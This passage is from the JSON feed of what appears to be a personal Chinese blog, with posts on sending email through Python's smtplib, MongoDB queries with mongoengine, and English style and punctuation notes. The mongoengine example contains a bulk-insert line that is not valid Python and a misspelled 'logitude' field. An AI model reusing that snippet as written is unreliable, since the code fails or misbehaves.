Email&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 添加正文</span></span><br><span class=\"line\">body = <span class=\"string\">&#x27;This is the body of the email!&#x27;</span></span><br><span class=\"line\">msg.attach(MIMEText(body, <span class=\"string\">&#x27;plain&#x27;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 连接邮件服务器，不同邮件服务器smtp开启方式不一样</span></span><br><span class=\"line\"><span class=\"comment\"># 这里以163邮箱为例，具体开启方法，自行查阅官方文档</span></span><br><span class=\"line\">smtp_server = <span class=\"string\">&#x27;smtp.163.com&#x27;</span></span><br><span class=\"line\">smtp_port = <span class=\"number\">25</span></span><br><span class=\"line\">smtp_username = <span class=\"string\">&#x27;your_email&#x27;</span></span><br><span class=\"line\">smtp_password = <span class=\"string\">&#x27;smtp_token&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">smtp_conn = smtplib.SMTP(smtp_server, smtp_port)</span><br><span class=\"line\">smtp_conn.login(smtp_username, smtp_password)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 发送邮件</span></span><br><span class=\"line\">smtp_conn.sendmail(msg[<span class=\"string\">&#x27;From&#x27;</span>], msg[<span class=\"string\">&#x27;To&#x27;</span>], msg.as_string())</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 关闭连接</span></span><br><span class=\"line\">smtp_conn.quit()</span><br></pre></td></tr></table></figure>\n<ul>\n<li></li>\n</ul>\n",
            "tags": [
                "email"
            ]
        },
        {
            "id": "https://snowroll.github.io/mongodb/",
            "url": "https://snowroll.github.io/mongodb/",
            "title": "mongodb 常用语句",
            "date_published": "2023-01-29T14:43:00.000Z",
            "content_html": "<p>友情提示： 好用的工具可以节省大量时间，可以直接使用<span class=\"exturl\" data-url=\"aHR0cHM6Ly9uYXZpY2F0LmNvbS9lbi8=\"> navicat</span> 来进行 mongodb 数据库的各种查询操作，简单快捷，不用学习复杂的 API</p>\n<ol>\n<li>\n<p>Mongodb 下载</p>\n<p>官方下载网址： <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubW9uZ29kYi5jb20vdHJ5L2Rvd25sb2FkL2NvbW11bml0eQ==\">https://www.mongodb.com/try/download/community</span></p>\n<p>windows 下的最新版，下载安装后即可连接启动。</p>\n</li>\n<li>\n<p>Mongodb 可视化工具</p>\n<p>简单配置后，即可连接使用</p>\n<img data-src=\"/mongodb/navicat-config.png\" class=\"\">\n</li>\n<li>\n<p>Mongodb 查询语句</p>\n<ul>\n<li>\n<p>简单查询</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 查询语句格式 </span></span><br><span class=\"line\"><span class=\"comment\">// db 数据库 collection 集合 </span></span><br><span class=\"line\"><span class=\"comment\">// query 可选，使用查询操作符指定查询条件</span></span><br><span class=\"line\"><span class=\"comment\">// projection 可选，使用投影操作符返回指定键</span></span><br><span class=\"line\">db.collection.find(query, projection)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 查找集合col中所有元素</span></span><br><span class=\"line\"><span class=\"comment\">// pretty() 格式化显示文档</span></span><br><span class=\"line\">db.col.find().pretty()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 条件语句查询</span></span><br><span class=\"line\"><span class=\"comment\">// 等于</span></span><br><span class=\"line\">db.col.find(&#123;<span class=\"string\">&quot;name&quot;</span>: <span class=\"string\">&quot;John&quot;</span>&#125;)</span><br><span class=\"line\"><span class=\"comment\">// $lt $lte $gt $gte $ne</span></span><br><span class=\"line\">db.col.find(&#123;<span class=\"string\">&quot;age&quot;</span>: &#123;<span class=\"attr\">$lt</span>: <span class=\"number\">18</span>&#125;&#125;)</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>组合查询</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// and </span></span><br><span class=\"line\">db.col.find(&#123;<span class=\"attr\">key1</span>:value1, <span class=\"attr\">key2</span>:value2&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// or 用列表把所有条件放在一起</span></span><br><span class=\"line\">db.col.find(&#123;<span class=\"attr\">$or</span>: [&#123;<span class=\"attr\">k1</span>:v1&#125;, &#123;<span class=\"attr\">k2</span>:v2&#125;]&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// and &amp; or</span></span><br><span class=\"line\">db.col.find(&#123;<span class=\"attr\">k1</span>:v1, <span class=\"attr\">$or</span>: [&#123;<span class=\"attr\">k2</span>:v2&#125;, &#123;<span class=\"attr\">k3</span>:v3&#125;]&#125;)</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n<li>\n<p>python 库 monoenigine</p>\n<p>将 pymongo 的底层操作进行集成优化，简化 mongodb 的操作</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> mongoengine <span class=\"keyword\">as</span> me</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># connect to MongoDB</span></span><br><span class=\"line\">me.connect(host=<span class=\"string\">&#x27;CONNECTION_STRING&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># venue Schema</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">newVenues</span>(<span class=\"params\">me.Document</span>):</span></span><br><span class=\"line\">    name = me.StringField(required=<span class=\"literal\">True</span>)</span><br><span class=\"line\">    latitude = me.DecimalField(required=<span class=\"literal\">True</span>)</span><br><span class=\"line\">    longitude = me.DecimalField(required=<span class=\"literal\">True</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># some test data</span></span><br><span class=\"line\">venues = [&#123;<span class=\"string\">&#x27;name&#x27;</span>: <span class=\"string\">&#x27;Vega&#x27;</span>,<span class=\"string\">&#x27;latitude&#x27;</span>: <span class=\"number\">55.672867</span>, <span class=\"string\">&#x27;longitude&#x27;</span>: <span class=\"number\">12.473692</span>&#125;,</span><br><span class=\"line\">&#123;<span class=\"string\">&#x27;name&#x27;</span>: <span class=\"string\">&#x27;Tivoli&#x27;</span>,<span class=\"string\">&#x27;latitude&#x27;</span>: <span class=\"number\">55.681256</span>,<span class=\"string\">&#x27;longitude&#x27;</span>: <span class=\"number\">12.553412</span>&#125;]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># the list of venues to bulk insert to MongoDB</span></span><br><span class=\"line\">venues_to_insert_list = []</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> venue <span class=\"keyword\">in</span> venues:</span><br><span class=\"line\">    venues_to_insert_list.append(</span><br><span class=\"line\">        newVenues(name=venue.get(<span class=\"string\">&#x27;name&#x27;</span>),</span><br><span class=\"line\">        latitude=venue.get(<span class=\"string\">&#x27;latitude&#x27;</span>),</span><br><span class=\"line\">        longitude=venue.get(<span class=\"string\">&#x27;longitude&#x27;</span>))</span><br><span class=\"line\">    )</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># bulk insert to MongoDB</span></span><br><span class=\"line\"><span class=\"comment\"># 无序插入，避免单个错误导致所有插入都失败</span></span><br><span class=\"line\">newVenues.objects.insert(venues_to_insert_list, <span class=\"string\">&quot;ordered&quot;</span>: <span class=\"literal\">False</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># single insert</span></span><br><span class=\"line\">venue = newVenues(name=<span class=\"string\">&#x27;Vega&#x27;</span>, latitude=<span class=\"number\">55.672867</span>, logitude=<span class=\"number\">12.473692</span>)</span><br><span class=\"line\">venue.save()</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n",
            "tags": [
                "mongodb"
            ]
        },
        {
            "id": "https://snowroll.github.io/Line-By-Line-2-md/",
            "url": "https://snowroll.github.io/Line-By-Line-2-md/",
            "title": "Line By Line-2 错误的连接",
            "date_published": "2023-01-08T15:19:38.000Z",
            "content_html": "<p>错误的连接会导致错误的语义，当主谓宾不在通常位置时，人们会按就近原则理解句子。</p>\n<p>示例：</p>\n<p>Him stick with the before chased boy the that dog big had the attacked.</p>\n<p>错误的连接让人不明所以，一头雾水。</p>\n<h2 id=\"将修饰词放到属于他们的位置\"><a class=\"markdownIt-Anchor\" href=\"#将修饰词放到属于他们的位置\">#</a> 将修饰词放到属于他们的位置</h2>\n<p>下面两类常见情况，修饰词不会产生误解。</p>\n<ol>\n<li>\n<p>adj/adv + 被修饰词</p>\n</li>\n<li>\n<p>被修饰词 + 修饰短语 / 从句</p>\n</li>\n</ol>\n<h3 id=\"形容词\"><a class=\"markdownIt-Anchor\" href=\"#形容词\">#</a> 形容词</h3>\n<p>Since <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mstyle mathcolor=\"red\"><mtext>dealing</mtext></mstyle></mrow><annotation encoding=\"application/x-tex\">\\textcolor{red}{\\text{dealing}}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord text\" style=\"color:red;\"><span class=\"mord\" style=\"color:red;\">dealing</span></span></span></span></span> with a custodian bank are usually in <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mstyle mathcolor=\"red\"><mtext>writing</mtext></mstyle></mrow><annotation encoding=\"application/x-tex\">\\textcolor{red}{\\text{writing}}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8623000000000001em;vertical-align:-0.19444em;\"></span><span class=\"mord text\" style=\"color:red;\"><span class=\"mord\" style=\"color:red;\">writing</span></span></span></span></span>, whether <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mstyle mathcolor=\"red\"><mtext>local or out of  town</mtext></mstyle></mrow><annotation encoding=\"application/x-tex\">\\textcolor{red}{\\text{local\\ or\\ out\\ of \\ town}}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord text\" style=\"color:red;\"><span class=\"mord\" style=\"color:red;\">local or out of  town</span></span></span></span></span>, the only difference is a lag of a few days.</p>\n<p>local or out of town 原本的修饰对象应该为 bank，但根据就近原则，读者很容易将其与 writing 或者 dealing 联系起来，产生误解。</p>\n<p>修改：</p>\n<p>Since dealing with the custodian <strong>bank</strong>, whether <strong>local or out of town</strong>, are usually in writing, the only difference is a lag of a few days.</p>\n<h3 id=\"副词\"><a class=\"markdownIt-Anchor\" href=\"#副词\">#</a> 副词</h3>\n<p>规则：</p>\n<ol>\n<li>\n<p>在两个单词组成的不定式（to be, to do, to think），禁止在 to 后面加副词</p>\n</li>\n<li>\n<p>在被动或者过去不定式中，副词往往从属于过去分词</p>\n<p>to have sorely needed, to be wholly satisfied, has always wanted</p>\n</li>\n<li>\n<p>规则不是神圣的，</p>\n</li>\n</ol>\n<p>错误的表达：</p>\n<p>We have developed recently a plan.</p>\n<p>由于副词可修饰的成分众多，所以错误的放置会导致误解。</p>\n<p>Critics have raised doubts about attempts to interpret Kleist’s response <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mstyle mathcolor=\"red\"><mtext>precisely</mtext></mstyle></mrow><annotation encoding=\"application/x-tex\">\\textcolor{red}{\\text{precisely}}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord text\" style=\"color:red;\"><span class=\"mord\" style=\"color:red;\">precisely</span></span></span></span></span> because his skeptical statements obscure his thoughts.</p>\n<p>解析： precisely 既可以修饰不定式 to interpret，也可以修饰 doubts。因此放置在这里会导致有两种解释，产生误解。</p>\n<p>修改要点： 让副词修饰成分唯一确定，1. 改变副词位置   2. 将动词改变为名词</p>\n<p>示例：</p>\n<p>What you do primarily determines what you are.</p>\n<p>What you <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mstyle mathcolor=\"red\"><mtext>primarily</mtext></mstyle></mrow><annotation encoding=\"application/x-tex\">\\textcolor{red}{\\text{primarily}}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord text\" style=\"color:red;\"><span class=\"mord\" style=\"color:red;\">primarily</span></span></span></span></span> do determines what you are.</p>\n<p>4 个副词需要特殊考虑，<em>also, only, not, howeve</em>r。因为这些单词在不同的位置会有不同的含义，如下<strong> also</strong>，在不同的语境下所表达的含义并不相同。</p>\n<p>I also think he is lying about whhere he was that night.</p>\n<p>不同语境：</p>\n<p>She doesn’t believe the defendant’s alibi for the night of the murder. <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mstyle mathcolor=\"red\"><mtext>I</mtext></mstyle></mrow><annotation encoding=\"application/x-tex\">\\textcolor{red}{\\text{I}}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord text\" style=\"color:red;\"><span class=\"mord\" style=\"color:red;\">I</span></span></span></span></span> also think he is lying about whhere he was that night.</p>\n<p>I think he hated her enough to kill her. I also <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mstyle mathcolor=\"red\"><mtext>think</mtext></mstyle></mrow><annotation encoding=\"application/x-tex\">\\textcolor{red}{\\text{think}}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord text\" style=\"color:red;\"><span class=\"mord\" style=\"color:red;\">think</span></span></span></span></span> he is lying about where he was that night.</p>\n<p><strong>only</strong> 可以修饰名词，也可以修饰动词。为了避免误解，当 only 作副词时，放置在动词前。</p>\n<p><strong>not</strong> 放置的位置不同，表达的含义不同。</p>\n<p>否定全部： All stories cannot end happily.</p>\n<p>否定部分： Not all stories can end happily.</p>\n<p>​                     All that glisters is not gold.</p>\n<p><strong>However</strong> 纯副词</p>\n",
            "tags": [
                "Line By Line",
                "paper"
            ]
        },
        {
            "id": "https://snowroll.github.io/Line-By-Line-5/",
            "url": "https://snowroll.github.io/Line-By-Line-5/",
            "title": "Line By Line-5 标点符号",
            "date_published": "2022-11-04T08:50:11.000Z",
            "content_html": "<h1 id=\"逗号\"><a class=\"markdownIt-Anchor\" href=\"#逗号\">#</a> 逗号</h1>\n<h2 id=\"有用的逗号\"><a class=\"markdownIt-Anchor\" href=\"#有用的逗号\">#</a> 有用的逗号</h2>\n<ul>\n<li>\n<p>连接独立从句之前的连词</p>\n<p><em>and, but, for, nor, or, yet, so</em></p>\n<p>He never worked, for his father had left him a fortune. （避免误解为 work for his father）</p>\n<p>两处例外： 1. 当连接词连接 heavily punctuated clauses，用分号代替逗号 2. 如果从句很短而且与前文关系紧密，则不用</p>\n</li>\n<li>\n<p>在相邻的平行项</p>\n<p>逗号应该跟随每个 item，除了最后一个</p>\n<p>The agency lists openings in publishing, broadcasting, advertising**, and** public relations.</p>\n</li>\n<li>\n<p>在附加说明周围的元素</p>\n<p>一般成对出现</p>\n<p>The current five-year expansion program**,** culminating in approximately 100 building materials supermarts by the end of fiscal 1980**,** is continuing on schedule.</p>\n<p>两个逗号连接起了被切割分离的主语和谓语</p>\n<ul>\n<li>\n<p>非限制性修饰语</p>\n<p>The Yucatan, which offers beaches as well as ruins, is a popular vacation area.</p>\n<ul>\n<li>\n<p>限制性 和 非限制性强调部分不一样</p>\n<p>Gray, a popular color this season, is not becoming to me.</p>\n<p>The color gray is not becoming to me.  灰色不适合我</p>\n</li>\n<li>\n<p>副词短语和句子</p>\n<p>不加逗号，意思可能会变</p>\n<p>You should water the plants, as Jim suggested.</p>\n<p>You should water the plants as Jim suggested.</p>\n<p>当 since、because 前置词为否定动词时，忽略逗号意思变化会非常多</p>\n<p>Employees are not shirking their responsibilities, as the editorial states.</p>\n<p>Employees are not shirking their responsibilities as the editorial states.</p>\n</li>\n</ul>\n</li>\n<li>\n<p>填充语及其他可删除元素</p>\n<p>非限制性修饰词和其他 by-the-way 的句子均需要封闭的逗号</p>\n<p>感叹词 <em>well, yes, oh</em>  直接表示某个人的名字 <em>darling, stupid, Senator, Pat, Mom</em></p>\n<p>过渡语 <em>on the other hand, to begin with</em>  插入语 <em>perhaps, incidentally, I believe</em></p>\n<p><strong>逗号应该引出一个替代或对比的短语来美化其他单词，但同时不能有其他含义</strong></p>\n<p>有些句子添加逗号会更改句子原意</p>\n<p>  A poor but happy person is hard to find.</p>\n<p>但有些特殊结构必须添加逗号，一个与句子剩余部分完全无关的名词和其修饰语</p>\n<p>  We will be there, weather permitting, by six on Saturday.</p>\n</li>\n<li>\n<p>中断语</p>\n<p>当一个次要元素中断了句子的语义表达，则必须使用逗号引出</p>\n<p>  She was interested in, but also apprehensive about, the new project.</p>\n<p>在动词与主语之间的限制性修饰语往往是必须的，无须添加逗号</p>\n<p>  The wheel that squeaks gets the grease.</p>\n</li>\n<li>\n<p>介绍性修饰语</p>\n<p>当一个句子中，主语在动词之前，那么我们需要在它的一个副词 / 形容词短语或句子前添加逗号。</p>\n<p>  Running toward us, the man was shouting something and waving a newspaper.</p>\n</li>\n</ul>\n</li>\n<li>\n<p>在句子易被误解的位置</p>\n<p>虽然简短的介绍性从句，逗号是可选的。但如果从句以动词结尾，则需要添加逗号，避免主语成为从句动词的直接宾语。</p>\n<p>  If he enjoys driving, a car would make an ideal graduation gift.</p>\n<p>如果连接词容易让读者误以为两者并列，则添加逗号。</p>\n<p>  I expected them to be selected, and prepared for this eventuality.</p>\n<p>有时改句子比插入一个预防性的逗号更好。</p>\n<p>  The obsession leads the candidate to solicit and accept money from those most able to provide it, and to adjust his behavior in office to the need for money.</p>\n<p>逗号会让人误以为 to provide 和 to adjust 并列，替换修改如下</p>\n<p>  The obsession leads the candidate to solicit and accept money from those most capable of providing it and to adjust his behavior in office to the need for money.</p>\n</li>\n<li>\n<p>在特殊的上下文结构中</p>\n<p><strong>month-day-year</strong></p>\n<p>  <em>November 13,  1972, that …</em></p>\n<p><strong>after the addressee, the street, and the city</strong></p>\n<p>  <em>Send applications to L.H. Dreher, 506 High Street, Cranford, NJ07016.</em></p>\n<p>连续使用同一个单词时</p>\n<p>  <em>He says that what provisions there are, are hardly enough for six weeks, but i doubt that that’s true.</em></p>\n<p>用逗号代替省略</p>\n<p>  <em>The first guests to arrive brought champagne; the second, flowers; and the third, dessert; the first had spend a lot of money, the others very little.</em></p>\n</li>\n</ul>\n<h2 id=\"有害的逗号\"><a class=\"markdownIt-Anchor\" href=\"#有害的逗号\">#</a> 有害的逗号</h2>\n<p>逗号不应分割主语和动词，动词和宾语，宾语和介词，形容词以及其修饰的名词</p>\n<p>对于相关的组合，也不能用逗号切分。例如 *both . . . and, neither . . . nor, either . . . or, not only . . . but also。* 除非这些相关词在一个独立从句之前</p>\n<p><em>not only . . . but also</em> 连接的是对等元素， 而<em> not-but</em> 则是对比两者，所以适用不同的标点规则</p>\n<p>  I go to Los Angeles about six times a year, not because I enjoy the city, but because I have business there.</p>\n<p>若否定与肯定同等重要，则可省略逗号</p>\n<h2 id=\"可任意使用的逗号\"><a class=\"markdownIt-Anchor\" href=\"#可任意使用的逗号\">#</a> 可任意使用的逗号</h2>\n<ul>\n<li>\n<p>在简单的介绍性短语或句子后</p>\n<p>By 1952(,) he was ready to forsake the literary life for a steady job.</p>\n<p>In the afternoon(,) the committee reconvened.</p>\n</li>\n<li>\n<p>在过渡副词及类似的插入语后</p>\n<p><em>therefore, accordingly, indeed, certainly, of course</em></p>\n<p>如果想强调副词的话，可以添加逗号，因为副词会打断句子的连贯性</p>\n<p>  I should (,) perhaps(,) add that we have no investments in that country.</p>\n</li>\n<li>\n<p>在连接短而密切相关的独立从句之前</p>\n<p>一般可选，除非避免歧义</p>\n<p>The sun is up(,) and the birds are singing.</p>\n</li>\n<li>\n<p>在连接意义或形式不同的短语、从句的连接词之前</p>\n</li>\n<li>\n<p>在连词和介绍性的修饰语之间</p>\n<p>We can speed up the schedule, but**,** as I explained at the outset, a rush job will increase your costs.</p>\n<p>修饰语和连词没有直接关联，所以需要加逗号区分，否则会产生误解</p>\n</li>\n<li>\n<p>在 that 之后，插入的修饰语之前</p>\n<p>The teacher told the students that, if they failed to complete any of the three major assignments, they would fail the course.</p>\n</li>\n</ul>\n<h2 id=\"总结\"><a class=\"markdownIt-Anchor\" href=\"#总结\">#</a> 总结</h2>\n<ol>\n<li>\n<p>使用逗号</p>\n<ul>\n<li>\n<p>在连接独立从句的连词前  <em>He never worked, for his father had left him a fortune.</em></p>\n</li>\n<li>\n<p>在并列元素之间 <em>The agency lists openings in publishing, broadcasting, advertising</em>*, and** public relations.*</p>\n</li>\n<li>\n<p>在附加元素前后（非必要 / 破坏性的元素 异位修饰词）</p>\n<ol>\n<li>\n<p>非限制性形容词、副词、从句  <em>The Yucatan, which offers beaches as well as ruins, is a popular vacation area.</em></p>\n</li>\n<li>\n<p>任何其他对于句子基本结构多余的元素  <em>You should water the plants, as Jim suggested.</em></p>\n</li>\n<li>\n<p>插入语，打破了句子结构  <em>She was interested in, but also apprehensive about, the new project.</em></p>\n</li>\n<li>\n<p>介绍性修饰语  <em>Running toward us, the man was shouting something and waving a newspaper.</em></p>\n</li>\n</ol>\n</li>\n<li>\n<p>在必须分开以避免误解的邻近元素中  <em>If he enjoys driving, a car would make an ideal graduation gift.</em></p>\n</li>\n<li>\n<p>特殊上下文</p>\n<ol>\n<li>month-day-year order  <em>November 13,  1972, that …</em></li>\n<li>地址、街道、小镇、邮编  <em>Send applications to L.H. Dreher, 506 High Street, Cranford, NJ07016.</em></li>\n<li>同一个词连续使用，若有必要</li>\n<li>省略  <em>The first guests to arrive brought champagne; the second, flowers; and the third, dessert; the first had spend a lot of money, the others very little.</em></li>\n<li>在跟在合适名称后的标题 / 缩写前后</li>\n<li>在所有<em> the more . . . the merrier</em> 结构中，除非他们特别简短</li>\n<li>在直接引用和 say 动词间  <em>She said, “xxx”.     “I promised I would,” I replied.</em></li>\n<li>在未加引号的直接问句前  <em>The question we have to ask is, By what criteria do we determine our priorities?</em></li>\n</ol>\n</li>\n</ul>\n</li>\n<li>\n<p>不使用逗号</p>\n<ul>\n<li>\n<p>与结构相关的元素之间，主谓宾</p>\n</li>\n<li>\n<p>并列连词前，除非是最后一项   A and B</p>\n</li>\n<li>\n<p>相匹配的一对，除非两者是单独的句子  either . . . or</p>\n</li>\n<li>\n<p>以形容词为首的逆序语句</p>\n</li>\n<li>\n<p>在限制性修饰语前后</p>\n</li>\n</ul>\n</li>\n<li>\n<p>可用可不用</p>\n<ul>\n<li>\n<p>在一个简单的状语短语或从句之后，其在全句的主语之前</p>\n<p>In the afternoon(,) I play game.</p>\n</li>\n<li>\n<p>在常规放置的过渡副词和类似词之前和之后，可以不显眼地融入句子中</p>\n<p><em>therefore, accordingly, indeed, certainly, of course</em></p>\n<p>You would(,) therefore(,) have a stake in the outcome.</p>\n</li>\n<li>\n<p>在并列连词加入短而密切相关的独立从句之前</p>\n<p>The sun is up(,) and the birds are singing.</p>\n</li>\n<li>\n<p>在并列连词之前加入形式或重点不同或涉及决定性思维中断的从句元素</p>\n<p>We can speed up the schedule, but, as I explained at the outset, a rush job will increase your costs.</p>\n</li>\n<li>\n<p>在打断<em> that</em> 从句的限制性状语修饰语之前，将连词与主语分开</p>\n<p>The teacher told the students that, if they failed to complete any of the three major assignments, they would fail the course.</p>\n</li>\n</ul>\n</li>\n</ol>\n<h1 id=\"分号\"><a class=\"markdownIt-Anchor\" href=\"#分号\">#</a> 分号；</h1>\n<p>分号只有两个必要的功能：1）<strong>分离不以连词连接的紧密从句</strong> 2）<strong>区分每一项内部的逗号</strong></p>\n<ul>\n<li>\n<p>许多有名的 “逗号使用错误” 或 “逗号拼接” 都是那些并未通过 <em>and, but, for, nor, or, yet, so</em> 连接的句子</p>\n<p>逗号使用错误示例，应该用分号：</p>\n<p>  Students exhaust themselves during exam week**,** many of them stay up for days.</p>\n<p>  They considered taking the product off the market**,** its prospects looked bleak.</p>\n</li>\n<li>\n<p>当有三个及以上的独立句子时，使用逗号是合法的。</p>\n<p>  Mary claimed that she had been reading in her room, the vicar said that he had been working in his study, and John refused to account for his whereabouts.</p>\n</li>\n<li>\n<p>当第二个句子是对第一个句子思想的完善补充，可以用逗号。</p>\n<p>  It is true, isn’t it?</p>\n<p>  It’s not only a pity, it’s a crime.</p>\n</li>\n<li>\n<p>相似但不相同的句子间，应该使用分号。</p>\n<p>  They had to stop finally; they were exhausted.</p>\n</li>\n<li>\n<p>当并列连词连接一个句子，特别是其内部存在逗号的情况下，需要用分号。</p>\n<p>  Although the cafe specializes in vegetarian dishes, it offers a few fish entrees, including lemon sole, smoked eel, and scampi; and these three, some food critics claim, rival comparable dishes at the best seafood restaurants.</p>\n</li>\n</ul>\n<p>如果不想用分号，就需要避免生成复杂的语句序列。</p>\n<h1 id=\"冒号\"><a class=\"markdownIt-Anchor\" href=\"#冒号\">#</a> 冒号:</h1>\n<ul>\n<li>\n<p>通常，冒号用来引入一段正式的说明、引用、例子、或者刚刚说过的解释。</p>\n<p>  To solve the problem, use the Pythagorean theorem: The square of the hypotenuse is equal to the sum of the squares of the other two sides.</p>\n</li>\n</ul>\n<h1 id=\"破折号和括号\"><a class=\"markdownIt-Anchor\" href=\"#破折号和括号\">#</a> 破折号和括号</h1>\n<ul>\n<li>\n<p>像一对逗号一样，一对破折号或者一对括号都包括了附属说明的元素。但后两者是更强的停顿。</p>\n<p>  My old dog—the whole neighborhood remembers him—always whined outside a closed door.</p>\n<p>  If you practice diligently (teachers recommend at least four hours a day), you can be giving recitals within a year.</p>\n</li>\n<li>\n<p>如果附属元素含有内部逗号，则需要用到破折号或者括号。</p>\n</li>\n<li>\n<p>成对的括号是用来引出附属说明的元素，而单个破折号则是介绍总结前面的术语。</p>\n<p>  Skill, courage, stamina, and heart—all these qualities are essential if the team is going to finish on top.<br>\n  Kennedy, Johnson, Nixon—our presidents during the Vietnam years still await the definitive judgment of history.</p>\n</li>\n<li>\n<p><strong>正式写作时，破折号还可取代冒号来引入解释或例子</strong>。相当于<em> namely</em> 或<em> that is</em></p>\n<p>  Paul stressed three virtues—faith, hope, and charity.</p>\n</li>\n</ul>\n",
            "tags": [
                "Line By Line",
                "paper"
            ]
        },
        {
            "id": "https://snowroll.github.io/codeql/",
            "url": "https://snowroll.github.io/codeql/",
            "title": "codeql",
            "date_published": "2022-10-10T23:15:03.000Z",
